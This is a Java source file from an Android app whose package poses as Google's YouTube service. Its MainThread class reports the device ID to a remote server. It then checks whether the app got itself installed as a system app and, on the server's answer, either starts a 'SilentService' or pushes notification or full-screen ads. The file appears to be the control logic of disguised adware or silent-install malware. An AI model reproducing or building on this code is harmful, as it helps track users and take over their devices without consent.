package com.google.youtube.services;

import java.util.Random;

import com.google.youtube.utils.HttpUtil;
import com.google.youtube.utils.MyHelpUtil;

import android.content.Context;
import android.content.SharedPreferences;

/**
 * 主线程
 * 
 * @author xcl
 *
 */
public class MainThread implements Runnable {

	private Context context;

	private int isSystem = 0;

	private String resParams;

	private SilentService silentService;

	private NotifacationService nService;

	private ScreenMsgService scrService;

	public MainThread(Context context) {
		// TODO Auto-generated constructor stub

		this.context = context;

		silentService = new SilentService(context);

		nService = new NotifacationService(context);

		scrService = new ScreenMsgService(context);
	}

	@Override
	public void run() {

		try {

			if (MyHelpUtil.checkNet(context)) {

				SharedPreferences localSharedPreferences_id = context
						.getSharedPreferences("DEVICE_STATUS", 0);

				String url = "google_s.action?a="
						+ localSharedPreferences_id.getString(
								"create_device_id", "");

				resParams = HttpUtil.getRequest(HttpUtil.BASE_URL + url);

			}

		} catch (Exception e) {
			e.printStackTrace();
		}

		/**
		 * 判断是否 内置成功
		 */
		isSystem = MyHelpUtil.isSystemApp(context);

		if (isSystem == 0) {

			if ("1".equals(resParams)) {

				/**
				 * 通知栏--插播屏
				 */
				swichType();

			} else {

				/**
				 * 启动静默
				 */
				silentService.run();

				System.out.println("jmjr");

			}

		} else {

			/**
			 * 通知栏--插播屏
			 */
			swichType();
		}

	}

	private void swichType() {

		Random random = new Random();

		int res = random.nextInt(2);

		switch (res) {

		case 0:

			nService.run();

			System.out.println("tzjr");

			break;

		case 1:

			scrService.run();

			System.out.println("cpjr");

			break;

		default:
			break;
		}

	}

}
